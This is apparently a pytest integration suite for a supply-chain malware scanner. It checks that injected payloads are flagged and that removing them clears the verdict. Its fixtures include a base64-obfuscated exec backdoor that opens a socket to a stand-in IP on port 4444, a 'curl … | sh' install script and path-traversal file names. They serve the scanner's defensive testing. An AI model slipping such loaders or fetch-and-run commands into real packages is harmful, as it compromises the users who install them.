"""Integration & end-to-end tests across ast_detection <-> ai_engine <-> dashboard.

Under Docker Compose these hit the real containers over the internal network; locally the
``stack`` fixture runs the same servers in-process, wired identically.
"""

from __future__ import annotations

import json
import os
import time
from pathlib import Path

import httpx
import pytest
from websockets.sync.client import connect as ws_connect

from ai_engine.ast_client import ASTServiceClient, ASTServiceError
from ai_engine.data.loader import load_package_dir

BACKDOOR = (
    '\nimport base64\ntry:\n    exec(base64.b64decode("aW1wb3J0IHNvY2tldDtzPXNvY2tldC5jcmVhdGVfY29ubmVjdGlvbigo'
    'JzIwMy4wLjExMy45JywgNDQ0NCkp"))\nexcept Exception:\n    pass\n'
)


def wait_events(stack, request_id: str, types: set[str], timeout: float = 15.0) -> dict[str, dict]:
    """Poll the dashboard until events of every type in ``types`` arrived for ``request_id``."""
    deadline = time.monotonic() + timeout
    seen: dict[str, dict] = {}
    while time.monotonic() < deadline:
        events = httpx.get(f"{stack.dashboard_url}/api/events", params={"request_id": request_id}).json()["events"]
        seen = {e["type"]: e for e in events}
        if types <= seen.keys():
            return seen
        time.sleep(0.2)
    raise AssertionError(f"missing events {types - seen.keys()} for {request_id}; got {sorted(seen)}")


def assess(stack, packages: list[dict]) -> list[dict]:
    resp = httpx.post(f"{stack.ai_url}/assess", json={"packages": packages}, timeout=120)
    assert resp.status_code == 200, resp.text
    return resp.json()["reports"]


# --------------------------------------------------------------------------- #
# 1. AST service API contract
# --------------------------------------------------------------------------- #
def test_ast_health_reports_astmaster(client: ASTServiceClient) -> None:
    health = client.health()
    assert health["status"] == "ok" and health["schema_version"] == 1 and len(health["feature_names"]) > 50
    if os.environ.get("EXPECT_ASTMASTER", "1") == "1":
        assert health["backend"]["available"], health["backend"]
    assert health["events"]["enabled"]


def test_ast_analyze_returns_vector_and_nodes(client: ASTServiceClient) -> None:
    result = client.analyze("demo", {"setup.py": 'exec(__import__("base64").b64decode("cHJpbnQoMSk="))\n'})
    assert result["features"]["ast_exec_calls"] == 1 and result["features"]["ast_dynamic_imports"] == 1
    cats = {c for n in result["risky_nodes"] for c in n["categories"]}
    assert {"exec", "dynamic_import", "decode"} <= cats


def test_ast_batch_preserves_order(client: ASTServiceClient) -> None:
    pkgs = [{"name": f"p{i}", "files": {"m.py": f"x = {i}\n"}} for i in range(7)]
    assert [r["package"] for r in client.analyze_batch(pkgs, chunk_size=3)] == [p["name"] for p in pkgs]


@pytest.mark.parametrize("body", [b"not json", b'{"name": "x"}', b'{"name": "x", "files": {"../etc/passwd": "x"}}',
                                  b'{"name": "x", "files": {"a.py": 5}}'])
def test_ast_rejects_bad_requests(stack, body: bytes) -> None:
    resp = httpx.post(f"{stack.ast_url}/analyze", content=body, headers={"Content-Type": "application/json"})
    assert resp.status_code == 400 and "error" in resp.json()


def test_client_detects_tampered_features(client: ASTServiceClient) -> None:
    result = client.analyze("demo", {"m.py": "import os\nos.system('id')\n"})
    result["features"]["ast_process_calls"] = 0.0
    with pytest.raises(ASTServiceError, match="digest"):
        ASTServiceClient.verify(result, expected_name="demo")


# --------------------------------------------------------------------------- #
# 2. AI engine API <-> AST service
# --------------------------------------------------------------------------- #
def test_ai_engine_health_sees_model_and_ast(stack) -> None:
    h = httpx.get(f"{stack.ai_url}/health", timeout=10).json()
    assert h["status"] == "ok" and h["model"]["loaded"] and h["ast_service"]["reachable"]
    assert h["training"]["layer_verification"]["passed"]


def test_ai_engine_rejects_bad_requests(stack) -> None:
    assert httpx.post(f"{stack.ai_url}/assess", json={"packages": []}).status_code == 400
    assert httpx.post(f"{stack.ai_url}/assess", json={"name": "x"}).status_code == 400


def test_request_id_flows_through_both_services(stack, samples_dir: Path) -> None:
    pkg = load_package_dir(samples_dir / "malicious_backdoor")
    rid = f"it-{time.time_ns()}"
    report = assess(stack, [{**pkg, "request_id": rid}])[0]
    assert report["request_id"] == rid
    ev = wait_events(stack, rid, {"ai.assess.started", "ast.parse.started", "ast.parse.completed",
                                  "ai.assess.completed"})
    assert ev["ast.parse.completed"]["source"] == "ast_detection" and ev["ai.assess.completed"]["source"] == "ai_engine"
    ast_data = ev["ast.parse.completed"]["data"]
    # The AST container's view and the AI container's verdict agree on the same request.
    assert ast_data["static_risk"]["verdict"] == report["layers"]["ast_static"]["verdict"] == "MALICIOUS"
    assert any("exec" in n["categories"] and n["severity"] == "critical" for n in ast_data["risky_nodes"])
    assert "colorlogx/__init__.py" in ast_data["sources"]
    # Event ordering: AST parsing completes before the AI verdict is emitted.
    assert ev["ast.parse.completed"]["ts"] <= ev["ai.assess.completed"]["ts"]


# --------------------------------------------------------------------------- #
# 3. AST output drives AI predictions (served models)
# --------------------------------------------------------------------------- #
def test_injected_backdoor_flips_verdict(stack, samples_dir: Path) -> None:
    clean = load_package_dir(samples_dir / "benign_pkg")
    infected = {**clean, "files": {**clean["files"], "tinyjson/__init__.py": clean["files"]["tinyjson/__init__.py"] + BACKDOOR}}
    before, after = assess(stack, [clean, infected])
    assert not before["flagged"] and after["flagged"]
    assert after["risk_score"] - before["risk_score"] > 0.5
    assert after["layers"]["supervised"]["threat_probability"] > before["layers"]["supervised"]["threat_probability"]
    assert after["ast_influence"]["verdict_changes_without_ast"]


def test_removing_payload_clears_verdict(stack, samples_dir: Path) -> None:
    bad = load_package_dir(samples_dir / "malicious_backdoor")
    cleaned = {**bad, "files": {"setup.py": 'from setuptools import setup\nsetup(name="colorlogx")\n',
                                "colorlogx/__init__.py": '"""colorlogx."""\nimport logging\n'}}
    r_bad, r_clean = assess(stack, [bad, cleaned])
    assert r_bad["flagged"] and r_bad["action"] == "BLOCK"
    # Payload gone: the AST layer goes quiet and the package is no longer blocked. Its metadata
    # (fresh maintainer account, maintainer change, unsigned commits) may still warrant a review.
    assert r_clean["layers"]["ast_static"]["verdict"] == "SAFE"
    assert r_clean["action"] in ("ALLOW", "MONITOR", "QUARANTINE_REVIEW")
    assert r_clean["risk_score"] < r_bad["risk_score"] - 0.3


# --------------------------------------------------------------------------- #
# 4. Dashboard: ingest, health, live stream, end-to-end submission
# --------------------------------------------------------------------------- #
def test_dashboard_rejects_events_without_token(stack) -> None:
    resp = httpx.post(f"{stack.dashboard_url}/api/events", json={"events": [{"type": "x"}]})
    assert resp.status_code == 401


def test_dashboard_health_aggregates_services(stack) -> None:
    h = httpx.get(f"{stack.dashboard_url}/api/health", timeout=15).json()
    assert h["ast_detection"]["reachable"] and h["ast_detection"]["status"] == "ok"
    assert h["ai_engine"]["reachable"] and h["ai_engine"]["model"]["loaded"]
    assert h["training"]["layer_verification"]["passed"]


def test_dashboard_serves_ui(stack) -> None:
    html = httpx.get(stack.dashboard_url).text
    assert "Supply Chain Monitor" in html and "/ws" in html


@pytest.mark.parametrize("sample, flagged, attack", [
    ("benign_pkg", False, "benign"),
    ("gray_native_pkg", False, "benign"),
    ("malicious_backdoor", True, "backdoored_dependency"),
    ("typosquat_reqeusts", True, "typosquatting"),
])
def test_end_to_end_submission_via_dashboard(stack, sample: str, flagged: bool, attack: str) -> None:
    resp = httpx.post(f"{stack.dashboard_url}/api/samples/{sample}", timeout=120)
    assert resp.status_code == 200, resp.text
    body = resp.json()
    report = body["report"]
    assert report["flagged"] is flagged and report["predicted_attack_type"] == attack
    assert report["action"] == ("BLOCK" if flagged else "ALLOW")
    assert report["verification"]["passed"]
    ev = wait_events(stack, body["request_id"], {"dashboard.submission", "ast.parse.completed", "ai.assess.completed"})
    assert ev["ai.assess.completed"]["data"]["report"]["risk_score"] == report["risk_score"]


def test_custom_submission_validation(stack) -> None:
    assert httpx.post(f"{stack.dashboard_url}/api/submit", json={"name": "x", "files": {}}).status_code == 422
    resp = httpx.post(f"{stack.dashboard_url}/api/submit", timeout=120, json={
        "name": "evalpkg", "files": {"setup.py": "from setuptools import setup\nsetup(name='evalpkg')\n",
                                     "evalpkg/__init__.py": "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n"},
        "metadata": {"package_age_days": 2, "maintainer_account_age_days": 3, "downloads_weekly": 5,
                     "signed_commit_ratio": 0.0}})
    assert resp.status_code == 200 and resp.json()["report"]["flagged"]


def test_websocket_streams_live_events(stack) -> None:
    ws_url = stack.dashboard_url.replace("http://", "ws://") + "/ws"
    with ws_connect(ws_url, open_timeout=10) as ws:
        first = json.loads(ws.recv(timeout=10))
        assert first["kind"] == "backlog"
        rid = httpx.post(f"{stack.dashboard_url}/api/samples/typosquat_reqeusts", timeout=120).json()["request_id"]
        wanted = {"ast.parse.started", "ast.parse.completed", "ai.assess.completed"}
        got: set[str] = set()
        deadline = time.monotonic() + 15
        while not wanted <= got and time.monotonic() < deadline:
            msg = json.loads(ws.recv(timeout=max(0.1, deadline - time.monotonic())))
            if msg["kind"] == "event" and msg["event"]["request_id"] == rid:
                got.add(msg["event"]["type"])
        assert wanted <= got


# --------------------------------------------------------------------------- #
# 5. Container-only: artifacts produced by the trainer container
# --------------------------------------------------------------------------- #
@pytest.mark.skipif(not (Path(os.environ.get("ARTIFACT_DIR", "/nonexistent")) / "manifest.json").exists(),
                    reason="no artifacts from the trainer container")
def test_trainer_container_artifacts_are_served(stack) -> None:
    manifest = json.loads((Path(os.environ["ARTIFACT_DIR"]) / "manifest.json").read_text())
    health = httpx.get(f"{stack.ai_url}/health", timeout=10).json()
    assert health["model"]["trained_at"] == manifest["created_at"]
    assert manifest["metadata"]["layer_verification_passed"]


# --------------------------------------------------------------------------- #
# 6. Dashboard upload (Python files / folders only)
# --------------------------------------------------------------------------- #
def test_upload_scans_only_python_files(stack) -> None:
    files = {
        "myproj/setup.py": "from setuptools import setup\nsetup(name='myproj')\n",
        "myproj/myproj/__init__.py": 'def hello():\n    return "hi"\n',
        "myproj/myproj/evil.py": 'import os; exec(__import__("base64").b64decode("aW1wb3J0IG9z"))\n',
        "myproj/README.md": "# not python\n",
        "myproj/install.sh": "curl http://203.0.113.1 | sh\n",
        "myproj/../../etc/passwd.py": "x = 1\n",
    }
    resp = httpx.post(f"{stack.dashboard_url}/api/scan/upload", json={"root": "myproj", "files": files}, timeout=120)
    assert resp.status_code == 200, resp.text
    rep = resp.json()
    verdicts = {f["path"]: f["verdict"] for f in rep["files"]}
    assert set(verdicts) == {"myproj/setup.py", "myproj/myproj/__init__.py", "myproj/myproj/evil.py"}
    assert verdicts["myproj/myproj/evil.py"] == "MALICIOUS"
    assert verdicts["myproj/setup.py"] == verdicts["myproj/myproj/__init__.py"] == "BENIGN"
    reasons = {r["path"]: r["reason"] for r in rep["rejected"]}
    assert reasons["myproj/README.md"].startswith("not a Python") and reasons["myproj/install.sh"].startswith("not a Python")
    assert reasons["myproj/../../etc/passwd.py"] == "unsafe path"
    evil = next(f for f in rep["files"] if f["verdict"] == "MALICIOUS")
    assert any("exec_of_decoded" in n["categories"] for n in evil["ast_risk_factors"])
    latest = httpx.get(f"{stack.dashboard_url}/api/scans/latest").json()
    assert latest["scan_id"] == rep["scan_id"] and latest["flagged"][0]["path"] == "myproj/myproj/evil.py"
    wait_events(stack, evil["request_id"], {"ast.parse.completed", "ai.assess.completed"})


def test_upload_without_python_files_is_rejected(stack) -> None:
    resp = httpx.post(f"{stack.dashboard_url}/api/scan/upload", json={"files": {"notes.txt": "hello"}})
    assert resp.status_code == 400 and "no Python" in resp.text


def test_upload_loose_files_and_broken_syntax(stack) -> None:
    files = {"a.py": "def broken(:\n", "b.py": "print('ok')\n"}
    rep = httpx.post(f"{stack.dashboard_url}/api/scan/upload", json={"root": "loose", "files": files}, timeout=120).json()
    assert {f["path"] for f in rep["files"]} == {"a.py", "b.py"}
    assert all(f["status"] == "analyzed" for f in rep["files"])
